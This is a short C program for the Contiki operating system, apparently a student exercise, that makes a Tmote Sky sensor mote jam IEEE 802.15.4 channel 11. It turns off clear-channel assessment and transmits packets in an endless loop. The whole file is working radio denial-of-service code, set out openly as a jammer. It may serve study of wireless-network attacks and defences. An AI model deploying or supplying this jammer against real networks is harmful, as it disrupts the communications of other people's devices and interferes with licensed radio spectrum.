
/**
 * \file
 *         Program for jamming a specific channel
 * \author
 *         Malthe Tøttrup <201907882@post.au.dk>
 * 
 *         $ make TARGET=sky distclean 
 *         $ make TARGET=sky MOTES=/dev/ttyUSB0 jammer.upload login
 */

#include "contiki.h"
#include <stdio.h> /* For printf() */
#include <math.h>
#include <os/dev/radio.h>  
#include "net/nullnet/nullnet.h"
#include "net/netstack.h"
#include <string.h>
#include "sys/log.h"


#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define SEND_INTERVAL (2 * CLOCK_SECOND)


/*---------------------------------------------------------------------------*/
PROCESS(jammer, "jammer process");
AUTOSTART_PROCESSES(&jammer);
/*---------------------------------------------------------------------------*/


PROCESS_THREAD(jammer, ev, data)
{   
    PROCESS_BEGIN();
    static int channel = 11;
    NETSTACK_RADIO.on();
    NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 0); //turning CCA off (https://sourceforge.net/p/contiki/mailman/message/34745886/)

    //Connect to the desired channel
    if(NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, channel) != RADIO_RESULT_OK) 
    {
        printf("failed channel set");
    }
    static unsigned count = 0;

    uint8_t * payload = (uint8_t *)&count;
    uint16_t payload_len = sizeof(count);

    while(1) {
        NETSTACK_RADIO.send(payload, payload_len);
        count++;
        printf("jamming \n");
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/
